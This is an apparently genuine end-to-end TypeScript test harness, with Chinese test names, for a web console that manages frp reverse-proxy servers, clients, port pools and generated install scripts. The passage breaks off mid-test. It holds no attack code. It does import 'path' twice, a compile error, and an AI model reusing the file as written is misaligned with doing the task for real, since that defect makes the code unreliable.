/**
 * End-to-end verification harness.
 *
 * Exercises the store, port allocator, renderers and installer generator, then
 * validates the generated frps.toml / frpc.toml with the real frp binaries.
 *
 *   FRP_CONSOLE_HOME=/tmp/frp-console-e2e npx tsx scripts/e2e.ts
 */
import assert from 'node:assert/strict';
import fsp from 'node:fs/promises';
import path from 'node:path';
import { execFile, spawn } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

import { ensureDirs } from '../src/config.js';
import { run } from '../src/db.js';
import { ensureSettingsRow } from '../src/db.js';
import { normalizeRanges, parseRanges, pickRandomPort, rangeContains } from '../src/ports.js';
import { renderFrpsToml, renderFrpsUnit, renderProxyBlockText } from '../src/render.js';
import { buildInstallPlan, renderInstallScript } from '../src/installer.js';
import { ensureBinary, DEFAULT_FRP_VERSION } from '../src/frp.js';
import { installBinaryAtomically } from '../src/frps-service.js';
import { recordHeartbeat, getHeartbeat, getNodeLiveStatus, HEARTBEAT_ONLINE_WINDOW_SEC } from '../src/heartbeat.js';
import { CUSTOM_SCRIPT } from '../src/custom-build.js';
import iconv from 'iconv-lite';
import { getServiceBackend, resetServiceBackend } from '../src/service-backend.js';
import {
  buildWindowsPackage,
  buildWindowsPackageFiles,
  renderWindowsManageCmd,
  renderWindowsStartCmd,
  renderWindowsTaskXml,
  LAUNCHER_PLACEHOLDER,
} from '../src/windows.js';
import {
  applyProxy,
  applyProxyIfHostAllowed,
  isValidProxy,
  normalizeProxy,
  resolveReleaseUrl,
} from '../src/mirror.js';
import {
  isPrivateAddress,
  normalizeBaseUrl,
  resolvePanelUrl,
} from '../src/panel-url.js';
import {
  archFromUname,
  checkCustomAvailability,
  findHostTarball,
  baseVersionOf,
  customVersionString,
  describeVariant,
  hostAssetArch,
  isCustomVersion,
  SUPPORTED_ARCHES,
} from '../src/variant.js';
import fs from 'node:fs';
import { TomlWriter } from '../src/toml.js';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  createNode,
  createProxy,
  getNode,
  deleteNode,
  deleteProxy,
  getSettings,
  listProxies,
  poolStats,
  rerollProxyPort,
  updateProxy,
  updateSettings,
  resolveNodeAuthToken,
  resolveNodeServerPort,
} from '../src/store.js';
import type { PortRange } from '../src/types.js';


/**
 * Obtain real frp binaries for config validation.
 *
 * Prefers the tuned build we actually ship (custom-frp/dist); falls back to a
 * one-off upstream download only when no prebuilt archive exists, so the suite
 * still runs on a bare checkout.
 */
async function ensureTestBinaries(): Promise<{ frps: string; frpc: string; source: 'custom' | 'upstream' }> {
  const distDir = path.join(path.dirname(CUSTOM_SCRIPT), 'dist');
  const arch = process.arch === 'x64' ? 'amd64' : process.arch;
  const tarball = path.join(distDir, `frp_${DEFAULT_FRP_VERSION}_linux_${arch}.tar.gz`);
  if (fs.existsSync(tarball)) {
    const tmp = await fsp.mkdtemp('/tmp/frp-test-bin-');
    await execFileAsync('tar', ['-xzf', tarball, '-C', tmp]);
    const inner = (await fsp.readdir(tmp, { withFileTypes: true })).find((e) => e.isDirectory());
    if (inner) {
      const frps = path.join(tmp, inner.name, 'frps');
      const frpc = path.join(tmp, inner.name, 'frpc');
      if (fs.existsSync(frps) && fs.existsSync(frpc)) {
        return { frps, frpc, source: 'custom' };
      }
    }
  }
  const frps = await ensureBinary('frps', DEFAULT_FRP_VERSION);
  const frpc = await ensureBinary('frpc', DEFAULT_FRP_VERSION);
  return { frps: frps.path, frpc: frpc.path, source: 'upstream' };
}

let passed = 0;
let failed = 0;

/** Resolve the custom build script regardless of CWD. */
function resolveCustomScript(): string {
  return CUSTOM_SCRIPT;
}

async function test(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    passed++;
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } catch (err) {
    failed++;
    console.log(`  \x1b[31m✗\x1b[0m ${name}`);
    console.log(`    ${err instanceof Error ? err.message : String(err)}`);
  }
}

function expectThrows(fn: () => unknown, needle: string) {
  try {
    fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    assert.ok(msg.includes(needle), `错误信息应包含 "${needle}"，实际为 "${msg}"`);
    return;
  }
  throw new Error(`预期抛出包含 "${needle}" 的错误，但没有抛出`);
}

async function main() {
  ensureDirs();
  ensureSettingsRow('e2etoken');

  console.log('\n\x1b[1m[1] 端口范围归一化\x1b[0m');
  await test('合并重叠与相邻区间', () => {
    const merged = normalizeRanges([
      { start: 30000, end: 30100 },
      { start: 20000, end: 20050 },
      { start: 20051, end: 20100 },
      { start: 25000, end: 25000 },
    ]);
    assert.deepEqual(merged, [
      { start: 20000, end: 20100 },
      { start: 25000, end: 25000 },
      { start: 30000, end: 30100 },
    ]);
  });
  await test('拒绝非法区间', () => {
    expectThrows(() => normalizeRanges([{ start: 100, end: 50 }]), '起始值不能大于结束值');
    expectThrows(() => normalizeRanges([{ start: 0, end: 10 }]), '必须在');
    expectThrows(() => normalizeRanges([{ start: 10, end: 70000 }]), '必须在');
  });
  await test('从空/坏 JSON 安全解析', () => {
    assert.deepEqual(parseRanges(''), []);
    assert.deepEqual(parseRanges('not-json'), []);
    assert.deepEqual(parseRanges('[{"start":10,"end":20}]'), [{ start: 10, end: 20 }]);
  });
  await test('随机取端口会避开已占用', () => {
    const ranges: PortRange[] = [{ start: 100, end: 105 }];
    const used = new Set([100, 101, 102, 103, 104]);
    assert.equal(pickRandomPort(ranges, used), 105);
    assert.equal(pickRandomPort(ranges, new Set([100, 101, 102, 103, 104, 105])), null);
  });

  console.log('\n\x1b[1m[2] frps 设置\x1b[0m');
  await test('写入设置并校验端口范围', () => {
    const { settings } = updateSettings({
      bindPort: 7000,
      authToken: 'e2e-secret-token',
      dashboardEnabled: true,
      dashboardPort: 7500,
      allowPorts: [{ start: 20000, end: 20020 }],
    });
    assert.equal(settings.bindPort, 7000);
    assert.equal(settings.authToken, 'e2e-secret-token');
    assert.deepEqual(settings.allowPorts, [{ start: 20000, end: 20020 }]);
  });
  await test('空 token 被拒绝', () => {
    expectThrows(() => updateSettings({ authToken: '   ' }), 'auth.token 不能为空');
  });
  await test('bindPort 落在端口池内时给出警告', () => {
    const { warnings } = updateSettings({ bindPort: 20005, allowPorts: [{ start: 20000, end: 20020 }] });
    assert.ok(warnings.some((w) => w.includes('bindPort')), `应包含 bindPort 警告: ${JSON.stringify(warnings)}`);
    updateSettings({ bindPort: 7000 });
  });

  console.log('\n\x1b[1m[4] 端口池耗尽与边界\x1b[0m');
  await test('池满时随机分配回退为 remotePort = 0（由 frps 自行分配）', () => {
    // Kept ahead of the main node's proxies: shrinking allowPorts triggers a
    // global re-allocation that would otherwise rewrite their ports.
    const sideNode = createNode({ name: '边界节点', serverAddr: 'frp.example.com' });
    try {
      updateSettings({ allowPorts: [{ start: 20018, end: 20018 }] });
      createProxy(sideNode.id, { name: 'exhaust-a', type: 'tcp', localPort: 1, remotePortRandom: false, remotePort: 20018 });
      const b = createProxy(sideNode.id, { name: 'exhaust-b', type: 'tcp', localPort: 2, remotePortRandom: true });
      assert.equal(b.remotePort, 0, `池满时应回退为 0，实际 ${b.remotePort}`);
      assert.equal(b.remotePortRandom, true);
    } finally {
      updateSettings({ allowPorts: [{ start: 20000, end: 20020 }] });
      deleteNode(sideNode.id);
    }
  });

  console.log('\n\x1b[1m[3] 节点与代理\x1b[0m');
  const node = createNode({
    name: '香港节点-A',
    serverAddr: 'frp.example.com',
    serverPort: 7000,
    protocol: 'tcp',
    frpcVersion: '0.71.0',
    installDir: '/etc/frp',
  });
  await test('创建节点并生成安装 token', () => {
    assert.ok(node.id > 0);
    assert.equal(node.name, '香港节点-A');
    assert.ok(node.installToken.length >= 12);
  });

  await test('显式远端端口分配成功', () => {
    const p = createProxy(node.id, {
      name: 'ssh',
      type: 'tcp',
      localIp: '127.0.0.1',
      localPort: 22,
      remotePortRandom: false,
      remotePort: 20001,
    });
    assert.equal(p.remotePort, 20001);
    assert.equal(p.remotePortRandom, false);
  });

  await test('端口超出 frps 范围时被拒绝', () => {
    expectThrows(
      () => createProxy(node.id, { name: 'oob', type: 'tcp', localPort: 80, remotePortRandom: false, remotePort: 40000 }),
      '不在 frps 允许的端口范围',
    );
  });

  await test('端口冲突时被拒绝', () => {
    expectThrows(
      () => createProxy(node.id, { name: 'dup', type: 'tcp', localPort: 80, remotePortRandom: false, remotePort: 20001 }),
      '已被其它代理占用',
    );
  });

  await test('frps 自身端口（dashboard）不可分配', () => {
    // Widen the pool so 7500 is in-range: the server-occupied check must win.
    updateSettings({ allowPorts: [{ start: 7500, end: 7500 }, { start: 20000, end: 20020 }] });
    expectThrows(
      () => createProxy(node.id, { name: 'dash', type: 'tcp', localPort: 80, remotePortRandom: false, remotePort: 7500 }),
      'frps 服务自身占用',
    );
    updateSettings({ allowPorts: [{ start: 20000, end: 20020 }] });
  });

  await test('随机分配落在配置范围内且互不冲突', () => {
    const ports: number[] = [];
    for (let i = 0; i < 5; i++) {
      const p = createProxy(node.id, { name: `rand-${i}`, type: 'tcp', localPort: 8000 + i, remotePortRandom: true });
      assert.equal(p.remotePortRandom, true);
      assert.ok(p.remotePort !== null && rangeContains(getSettings().allowPorts, p.remotePort), `端口 ${p.remotePort} 应在范围内`);
      ports.push(p.remotePort);
    }
    assert.equal(new Set(ports).size, ports.length, `随机端口出现重复: ${ports}`);
  });

  await test('随机端口可以重新摇号', () => {
    const p = createProxy(node.id, { name: 'reroll-me', type: 'tcp', localPort: 9000, remotePortRandom: true });
    const before = p.remotePort;
    const after = rerollProxyPort(p.id);
    assert.ok(after.remotePort !== null);
    assert.ok(before !== after.remotePort, '重新摇号应换到不同端口');
  });

  await test('随机端口可被切换为固定端口', () => {
    const p = createProxy(node.id, { name: 'flip', type: 'tcp', localPort: 9100, remotePortRandom: true });
    // Pick a concrete port the random allocations have not already claimed.
    const used = new Set(listProxies(node.id).map((x) => x.remotePort).filter(Boolean) as number[]);
    const settings = getSettings();
    const free = [];
    for (const r of settings.allowPorts) {
      for (let port = r.start; port <= r.end; port++) if (!used.has(port)) free.push(port);
    }
    assert.ok(free.length > 0, '应有可用端口用于本用例');
    const target = free[free.length - 1];
    const fixed = updateProxy(p.id, { remotePortRandom: false, remotePort: target });
    assert.equal(fixed.remotePort, target);
    assert.equal(fixed.remotePortRandom, false);
  });

  await test('HTTP 代理需要 vhostHTTPPort，未配置时拒绝创建', () => {
    expectThrows(
      () => createProxy(node.id, { name: 'web-novhost', type: 'http', localPort: 8080, customDomains: ['a.com'] }),
      '未配置 vhostHTTPPort',
    );
  });

  await test('配置 vhostHTTPPort 后可创建 HTTP 代理（不需要远端端口）', () => {
    updateSettings({ vhostHttpPort: 8081 });
    const p = createProxy(node.id, {
      name: 'web',
      type: 'http',
      localPort: 8080,
      customDomains: ['app.example.com'],
      subdomain: 'app',
    });
    assert.equal(p.remotePort, null);
    assert.deepEqual(p.customDomains, ['app.example.com']);
  });

  await test('节点内代理名唯一', () => {
    expectThrows(() => createProxy(node.id, { name: 'ssh', type: 'tcp', localPort: 22, remotePort: 20002 }), '已存在名为');
  });

  await test('删除代理释放端口', () => {
    // Pick a concrete port that is currently free so the test is deterministic.
    const used = new Set(listProxies(node.id).map((x) => x.remotePort).filter(Boolean) as number[]);
    const settings = getSettings();
    let target = null;
    for (const r of settings.allowPorts) {
      for (let port = r.start; port <= r.end; port++) {
        if (!used.has(port)) { target = port; break; }
      }
      if (target !== null) break;
    }
    assert.ok(target !== null, '应有空闲端口');
    const p = createProxy(node.id, { name: 'temp', type: 'tcp', localPort: 1234, remotePortRandom: false, remotePort: target });
    deleteProxy(p.id);
    const reused = createProxy(node.id, { name: 'temp2', type: 'tcp', localPort: 1234, remotePortRandom: false, remotePort: target });
    assert.equal(reused.remotePort, target);
  });

  await test('端口池统计正确', () => {
    const stats = poolStats();
    assert.ok(stats.total === 21, `总端口数应为 21，实际 ${stats.total}`);
    assert.ok(stats.used > 0);
    assert.equal(stats.free, stats.total - stats.used);
    assert.ok(stats.reservedByServer.includes(7000), `服务端保留端口应含 7000: ${stats.reservedByServer}`);
  });

  console.log('\n\x1b[1m[5] 产物渲染\x1b[0m');
  const settings = getSettings();
  const frpsToml = renderFrpsToml(settings);
  const unit = renderFrpsUnit();

  await test('frps.toml 包含关键字段', () => {
    assert.ok(frpsToml.includes('bindPort = 7000'));
    assert.ok(frpsToml.includes('auth.token = "e2e-secret-token"'));
    assert.ok(frpsToml.includes('webServer.port = 7500'));
    assert.ok(frpsToml.includes('{ start = 20000, end = 20020 }'), frpsToml);
  });
  await test('tcpMux 开启时不写 heartbeatTimeout（否则每 90 秒断连）', () => {
    // frp disables the application-layer heartbeat on both sides when tcpMux is
    // on. Writing an explicit heartbeatTimeout makes frps wait for heartbeats
    // that frpc never sends, so frps closes the control connection on a fixed
    // interval and ALL multiplexed tunnels drop with it.
    updateSettings({ tcpMux: true, heartbeatTimeout: 90, bindPort: 37100, authToken: 't' });
    const toml = renderFrpsToml(getSettings());
    assert.ok(
      !toml.includes('heartbeatTimeout'),
      `tcpMux=true 时不得写 heartbeatTimeout，否则控制连接会被周期性关闭。实际配置:\n${toml}`,
    );
    assert.match(toml, /transport\.tcpMux = true/);
  });

  await test('tcpMux 关闭时才写 heartbeatTimeout', () => {
    updateSettings({ tcpMux: false, heartbeatTimeout: 90 });
    const toml = renderFrpsToml(getSettings());
    assert.match(toml, /transport\.heartbeatTimeout = 90/);
    assert.match(toml, /transport\.tcpMux = false/);
    // restore for later tests
    updateSettings({ tcpMux: true });
  });

  await test('frpc.toml 的 tcpMux 与 frps 保持一致', () => {
    const n = createNode({ name: 'mux-节点', serverAddr: 'mux.example.com' });
    updateSettings({ tcpMux: true, publicBaseUrl: 'http://panel:37000' });
    const planOn = buildInstallPlan(n.id);
    assert.match(planOn.frpcToml, /transport\.tcpMux = true/, 'frpc 应显式声明 tcpMux=true');

    updateSettings({ tcpMux: false });
    const planOff = buildInstallPlan(n.id);
    assert.match(planOff.frpcToml, /transport\.tcpMux = false/, 'frps 关闭时 frpc 也必须关闭');

    updateSettings({ tcpMux: true });
    deleteNode(n.id);
  });

  await test('systemd unit 指向配置文件', () => {
    assert.ok(unit.includes('ExecStart='));
    assert.ok(unit.includes('frps -c'));
    assert.ok(unit.includes('[Install]'));
  });

  const plan = buildInstallPlan(node.id);
  const script = renderInstallScript(plan, { panelUrl: 'http://panel.example.com:8080' });

  await test('frpc.toml 包含多个 [[proxies]] 段', () => {
    const blocks = plan.frpcToml.match(/\[\[proxies\]\]/g) ?? [];
    const enabled = listProxies(node.id).filter((p) => p.enabled).length;
    assert.equal(blocks.length, enabled, `应生成 ${enabled} 个 proxies 段，实际 ${blocks.length}`);
    assert.ok(blocks.length >= 5, '应至少有 5 个代理');
  });
  await test('frpc.toml 正确渲染 tcp / http / 随机端口', () => {
    assert.ok(plan.frpcToml.includes('type = "tcp"'));
    assert.ok(plan.frpcToml.includes('type = "http"'));
    assert.ok(plan.frpcToml.includes('customDomains = ["app.example.com"]'));
    assert.ok(plan.frpcToml.includes('serverAddr = "frp.example.com"'));
    // Random proxies get a concrete port drawn from the pool so the panel's
    // view and the runtime config never disagree.
    const randomProxies = listProxies(node.id).filter((p) => p.remotePortRandom && p.remotePort);
    assert.ok(randomProxies.length > 0, '应存在带具体端口的随机代理');
    for (const p of randomProxies) {
      assert.ok(plan.frpcToml.includes(`remotePort = ${p.remotePort}`), `应渲染 remotePort = ${p.remotePort}`);
    }
    assert.ok(plan.frpcToml.includes('auto-allocated by frp-console'));
  });
  await test('安装脚本包含内嵌 base64 配置与 systemd 守护', () => {
    assert.ok(script.startsWith('#!/usr/bin/env bash'));
    assert.ok(script.includes('base64 -d > "$INSTALL_DIR/frpc.toml"'));
    assert.ok(script.includes('systemctl enable "$SERVICE_NAME"'));
    assert.ok(script.includes('Restart=always'));
    assert.ok(script.includes(`SERVICE_NAME="\${SERVICE_NAME:-frpc-`));
    assert.ok(script.includes('--uninstall'), '应支持卸载');
    assert.ok(script.includes('--refresh'), '应支持刷新配置');
    assert.ok(script.includes('x86_64|amd64)   ARCH=amd64'), '应支持多架构');
  });
  await test('安装脚本可被 bash 语法解析', async () => {
    const tmp = path.join('/tmp', `frpc-install-${Date.now()}.sh`);
    await fsp.writeFile(tmp, script, 'utf8');
    await execFileAsync('bash', ['-n', tmp]);
    await fsp.rm(tmp, { force: true });
  });
  await test('安装脚本内嵌的 base64 可还原为 frpc.toml', async () => {
    const m = script.match(/<<'FRPC_TOML_B64'\n([\s\S]*?)\nFRPC_TOML_B64/);
    assert.ok(m, '应能提取 heredoc 内容');
    const decoded = Buffer.from(m[1].replace(/\n/g, ''), 'base64').toString('utf8');
    assert.equal(decoded, plan.frpcToml);
  });

  console.log('\n\x1b[1m[6] 单块 [[proxies]] 渲染（面板实时预览复用此逻辑）\x1b[0m');

  await test('tcp 块包含 name/type/localIP/localPort/remotePort', () => {
    const draft = {
      id: 0, nodeId: 0, name: 'ssh', type: 'tcp' as const,
      localIp: '127.0.0.1', localPort: 22, remotePort: 31008, remotePortRandom: false,
      customDomains: [], subdomain: '', locations: [], multiplexer: '', secretKey: '',
      useEncryption: false, useCompression: false, bandwidthLimit: '', proxyProtocol: '',
      httpUser: '', httpPassword: '', hostHeaderRewrite: '', enabled: true, sortOrder: 0,
    };
    const text = renderProxyBlockText(draft, { remotePort: 31008, random: false });
    assert.match(text, /\[\[proxies\]\]/);
    assert.match(text, /name = "ssh"/);
    assert.match(text, /type = "tcp"/);
    assert.match(text, /localIP = "127\.0\.0\.1"/);
    assert.match(text, /localPort = 22/);
    assert.match(text, /remotePort = 31008/);
  });

  await test('随机端口块渲染为具体端口并标注来源', () => {
    const draft = {
      id: 0, nodeId: 0, name: 'game', type: 'tcp' as const,
      localIp: '127.0.0.1', localPort: 25565, remotePort: 20003, remotePortRandom: true,
      customDomains: [], subdomain: '', locations: [], multiplexer: '', secretKey: '',
      useEncryption: false, useCompression: false, bandwidthLimit: '', proxyProtocol: '',
      httpUser: '', httpPassword: '', hostHeaderRewrite: '', enabled: true, sortOrder: 0,
    };
    const text = renderProxyBlockText(draft, { remotePort: 20003, random: true });
    assert.match(text, /remotePort = 20003/);
    assert.match(text, /auto-allocated by frp-console/);
  });

  await test('单块渲染结果与完整 frpc.toml 中的对应段落一致', () => {
    const target = listProxies(node.id).find((p) => p.type === 'tcp' && p.remotePort);
    assert.ok(target, '应存在一个 tcp 代理');
    const single = renderProxyBlockText(target, { remotePort: target.remotePort, random: target.remotePortRandom });
    // The full config contains this block verbatim (modulo blank-line padding).
    const norm = (s: string) => s.replace(/\n{2,}/g, '\n').trim();
    assert.ok(
      norm(plan.frpcToml).includes(norm(single)),
      `完整配置应包含该块\n--- 单块 ---\n${single}\n--- 完整 ---\n${plan.frpcToml}`,
    );
  });

  console.log('\n\x1b[1m[8] 密钥继承与二进制原子替换（修复回归）\x1b[0m');

  await test('节点留空 token 时自动继承 frps 当前密钥', () => {
    const n = createNode({ name: '继承测试', serverAddr: 'a.example.com', authToken: '' });
    updateSettings({ authToken: 'rotated-token-A' });
    assert.equal(resolveNodeAuthToken(getNode(n.id)!), 'rotated-token-A', '应跟随 frps 密钥');

    // Rotating the frps token must propagate without touching the node.
    updateSettings({ authToken: 'rotated-token-B' });
    assert.equal(resolveNodeAuthToken(getNode(n.id)!), 'rotated-token-B', '轮换后应自动更新');
    updateSettings({ authToken: 'e2e-secret-token' });
  });

  await test('节点显式覆盖 token 时优先使用覆盖值', () => {
    const n = createNode({ name: '覆盖测试', serverAddr: 'b.example.com', authToken: 'my-own-token' });
    assert.equal(resolveNodeAuthToken(getNode(n.id)!), 'my-own-token');
    deleteNode(n.id);
  });

  await test('改 frps 密钥后安装脚本里的 token 同步更新', () => {
    const n = createNode({ name: '脚本同步测试', serverAddr: 'c.example.com' });
    updateSettings({ authToken: 'script-token-1' });
    const before = buildInstallPlan(n.id).frpcToml;
    assert.match(before, /auth\.token = "script-token-1"/);

    updateSettings({ authToken: 'script-token-2' });
    const after = buildInstallPlan(n.id).frpcToml;
    assert.match(after, /auth\.token = "script-token-2"/, '重新生成时应使用新密钥');
    assert.doesNotMatch(after, /script-token-1/, '不应残留旧密钥');

    updateSettings({ authToken: 'e2e-secret-token' });
    deleteNode(n.id);
  });

  await test('节点未设端口时跟随 frps bindPort', () => {
    updateSettings({ bindPort: 7100 });
    const n = createNode({ name: '端口跟随', serverAddr: 'd.example.com' });
    assert.equal(resolveNodeServerPort(getNode(n.id)!), 7100);
    updateSettings({ bindPort: 7100 });
    const plan2 = buildInstallPlan(n.id);
    assert.match(plan2.frpcToml, /serverPort = 7100/);
    updateSettings({ bindPort: 7000 });
    deleteNode(n.id);
  });



  console.log('\n\x1b[1m[9] GitHub 代理 / 镜像 URL 处理\x1b[0m');

  await test('前缀代理按 <proxy>/<original url> 拼接', () => {
    const url = 'https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz';
    assert.equal(
      applyProxy(url, 'https://raw.xiaoy.de'),
      `https://raw.xiaoy.de/${url}`,
    );
  });

  await test('代理地址归一化（去尾斜杠、补 https、留空=直连）', () => {
    assert.equal(normalizeProxy('https://raw.xiaoy.de/'), 'https://raw.xiaoy.de');
    assert.equal(normalizeProxy('raw.xiaoy.de'), 'https://raw.xiaoy.de');
    assert.equal(normalizeProxy(''), '');
    assert.equal(normalizeProxy(undefined), '');
  });

  await test('空代理时 URL 保持不变（直连）', () => {
    const url = 'https://github.com/a/b';
    assert.equal(applyProxy(url, ''), url);
    assert.equal(applyProxy(url, null), url);
  });

  await test('不重复套用代理', () => {
    const proxied = 'https://raw.xiaoy.de/https://github.com/a/b';
    assert.equal(applyProxy(proxied, 'https://raw.xiaoy.de'), proxied);
  });

  await test('代理地址校验', () => {
    assert.equal(isValidProxy('https://raw.xiaoy.de'), true);
    assert.equal(isValidProxy('http://1.2.3.4:8080'), true);
    assert.equal(isValidProxy(''), true);
    assert.equal(isValidProxy('not a url'), false);
  });

  await test('resolveReleaseUrl 优先级：自建镜像 > GitHub 代理 > 直连', () => {
    const opts = { version: '0.71.0', asset: 'frp_0.71.0_linux_amd64.tar.gz' };
    const direct = resolveReleaseUrl({ ...opts });
    assert.match(direct, /^https:\/\/github\.com\//);

    const proxied = resolveReleaseUrl({ ...opts, githubProxy: 'https://raw.xiaoy.de' });
    assert.equal(proxied, `https://raw.xiaoy.de/${direct}`);

    const mirrored = resolveReleaseUrl({ ...opts, mirrorBase: 'https://mirror.example.com/frp', githubProxy: 'https://raw.xiaoy.de' });
    assert.equal(mirrored, 'https://mirror.example.com/frp/v0.71.0/frp_0.71.0_linux_amd64.tar.gz');
  });

  await test('applyProxyIfHostAllowed 不代理 API 主机（避免 403）', () => {
    const api = 'https://api.github.com/repos/fatedier/frp/releases/latest';
    // api.github.com is not in the download allow-list.
    assert.equal(applyProxyIfHostAllowed(api, 'https://raw.xiaoy.de'), api);
    const dl = 'https://github.com/fatedier/frp/releases/download/v1/a.tgz';
    assert.equal(applyProxyIfHostAllowed(dl, 'https://raw.xiaoy.de'), `https://raw.xiaoy.de/${dl}`);
  });

  await test('面板设置可保存并回读镜像配置', () => {
    const { settings } = updateSettings({
      githubProxy: 'https://raw.xiaoy.de/',
      goproxy: 'https://goproxy.cn,direct',
      goDownloadBase: 'https://golang.google.cn/dl/',
    });
    assert.equal(settings.githubProxy, 'https://raw.xiaoy.de', '保存时应归一化去掉尾斜杠');
    assert.equal(settings.goproxy, 'https://goproxy.cn,direct');
    assert.equal(settings.goDownloadBase, 'https://golang.google.cn/dl');

    const readBack = getSettings();
    assert.equal(readBack.githubProxy, 'https://raw.xiaoy.de', '应持久化到数据库');
    assert.equal(readBack.githubProxyApi, false);
  });

  await test('非法代理地址被拒绝', () => {
    expectThrows(() => updateSettings({ githubProxy: 'not a url' }), 'GitHub 代理地址无效');
  });

  await test('githubProxy 仅用于定制构建拉取源码（不再进入节点安装脚本）', () => {
    const n = createNode({ name: '代理节点', serverAddr: 'p.example.com' });
    updateSettings({ githubProxy: 'https://raw.xiaoy.de' });
    const plan = buildInstallPlan(n.id);
    const script = renderInstallScript(plan, { panelUrl: 'http://panel:34567' });

    // 节点分发只走面板/自建镜像，GitHub 代理不再出现在脚本里。
    assert.ok(!script.includes('GITHUB_PROXY'), '安装脚本不应含 GitHub 代理');
    assert.ok(!script.includes('raw.xiaoy.de'), '安装脚本不应含代理地址');

    deleteNode(n.id);
    updateSettings({ githubProxy: '' });
  });

  await test('恢复镜像设置为初始状态（避免影响后续用例）', () => {
    updateSettings({ githubProxy: '', goproxy: '', goDownloadBase: '', githubProxyApi: false });
    const s = getSettings();
    assert.equal(s.githubProxy, '');
    assert.equal(s.goproxy, '');
    assert.equal(s.goDownloadBase, '');
    assert.equal(s.githubProxyApi, false);
  });


  console.log('\n\x1b[1m[10] 面板公网地址解析\x1b[0m');

  await test('已保存的设置优先于一切', () => {
    const r = resolvePanelUrl({
      setting: 'https://frp.example.com',
      envValue: 'https://env.example.com',
      port: 34567,
      requestHost: 'other.example.com',
    });
    assert.equal(r.url, 'https://frp.example.com');
    assert.equal(r.source, 'setting');
    assert.equal(r.isGuess, false);
  });

  await test('无设置时使用环境变量', () => {
    const r = resolvePanelUrl({
      setting: '',
      envValue: 'http://1.2.3.4:34567',
      port: 34567,
      requestHost: 'lan.local',
    });
    assert.equal(r.url, 'http://1.2.3.4:34567');
    assert.equal(r.source, 'env');
    assert.equal(r.isGuess, false);
  });

  await test('都未设置时采用请求的 Host（公网域名不算猜测）', () => {
    // A Host header without a port means the client used the default port.
    const r = resolvePanelUrl({
      setting: '',
      envValue: '',
      port: 34567,
      requestHost: 'frp.mydomain.com',
    });
    assert.equal(r.url, 'http://frp.mydomain.com');
    assert.equal(r.source, 'auto');
    assert.equal(r.isGuess, false, '公网域名访问不应标记为猜测');
  });

  await test('Host 带非默认端口时原样保留', () => {
    const r = resolvePanelUrl({ setting: '', envValue: '', port: 34567, requestHost: 'frp.mydomain.com:8080' });
    assert.equal(r.url, 'http://frp.mydomain.com:8080');
  });

  await test('Host 为内网地址时回退为内网猜测并标记', () => {
    const r = resolvePanelUrl({
      setting: '',
      envValue: '',
      port: 34567,
      requestHost: '10.88.32.112:34567',
    });
    assert.equal(r.source, 'auto');
    assert.equal(r.isGuess, true, '内网 IP 必须标记为猜测，提示运维去设置');
  });

  await test('HTTPS 反代下的域名不带端口', () => {
    const r = resolvePanelUrl({ setting: '', envValue: '', port: 34567, requestHost: 'https://frp.example.com' });
    assert.equal(r.url, 'https://frp.example.com');
  });

  await test('Host 为 :443 时推断为 https', () => {
    const r = resolvePanelUrl({ setting: '', envValue: '', port: 34567, requestHost: 'frp.example.com:443' });
    assert.equal(r.url, 'https://frp.example.com:443');
  });

  await test('URL 归一化：补协议、去尾斜杠、保留路径前缀', () => {
    assert.equal(normalizeBaseUrl('http://a.com/'), 'http://a.com');
    assert.equal(normalizeBaseUrl('  https://a.com/b/  '), 'https://a.com/b');
    // 面板默认端口在 HTTP 启发式列表内，裸主机名会被补成 http://
    assert.equal(normalizeBaseUrl('a.com:26000'), 'http://a.com:26000');
    // 未知端口按安全优先补 https://
    assert.equal(normalizeBaseUrl('a.com:9999'), 'https://a.com:9999');
    assert.equal(normalizeBaseUrl(''), '');
  });

  await test('内网地址识别覆盖 RFC1918 与 CGNAT', () => {
    for (const ip of ['10.0.0.1', '172.16.0.1', '172.31.255.255', '192.168.1.1', '127.0.0.1', '169.254.1.1', '100.64.0.1']) {
      assert.equal(isPrivateAddress(ip), true, `${ip} 应判为内网`);
    }
    for (const ip of ['8.8.8.8', '1.2.3.4', '172.32.0.1', 'frp.example.com']) {
      assert.equal(isPrivateAddress(ip), false, `${ip} 应判为公网`);
    }
  });

  await test('非法公网地址被拒绝', () => {
    expectThrows(() => updateSettings({ publicBaseUrl: 'ht!tp://bad url' }), '面板公网地址无效');
  });

  await test('设置可持久化并在安装脚本生效', () => {
    updateSettings({ publicBaseUrl: 'https://panel.example.com' });
    assert.equal(getSettings().publicBaseUrl, 'https://panel.example.com');

    const n = createNode({ name: '公网地址节点', serverAddr: 'p.example.com' });
    const plan = buildInstallPlan(n.id);
    const script = renderInstallScript(plan, { panelUrl: getSettings().publicBaseUrl });
    assert.match(script, /Environment=FRP_CONSOLE_PANEL_URL=https:\/\/panel\.example\.com/);
    assert.match(script, /https:\/\/panel\.example\.com\/api\/install\//);
    deleteNode(n.id);
    updateSettings({ publicBaseUrl: '' });
  });


  console.log('\n\x1b[1m[11] 安装脚本的覆盖更新（重装）行为\x1b[0m');

  await test('脚本支持覆盖更新：识别已安装、备份旧配置、清理旧服务', () => {
    const n = createNode({ name: '更新测试节点', serverAddr: 'u.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:34567' });

    // 识别是否已有安装
    assert.match(script, /IS_UPDATE=0/, '应初始化更新标记');
    assert.match(script, /IS_UPDATE=1/, '检测到已安装时应置为更新');
    // 覆盖前备份旧配置
    assert.match(script, /cp -f "\$INSTALL_DIR\/frpc\.toml" "\$INSTALL_DIR\/frpc\.toml\.bak"/, '应备份旧配置');
    // 重置 token 后服务名会变，必须清理同节点的旧服务
    assert.match(script, /STALE_UNITS/, '应清理旧服务');
    assert.match(script, /grep -q "ExecStart=\$INSTALL_DIR\/frpc"/, '只清理同一安装目录的 unit');
    // 区分安装与更新
    assert.match(script, /更新完成（覆盖安装）/, '更新时应提示覆盖安装');
    assert.match(script, /安装完成，服务/, '全新安装时用不同措辞');
    // 失败时可回滚
    assert.match(script, /可用旧配置回滚/, '失败时应提示回滚方法');

    deleteNode(n.id);
  });

  await test('覆盖安装不会误删其他节点的服务（按安装目录区分）', () => {
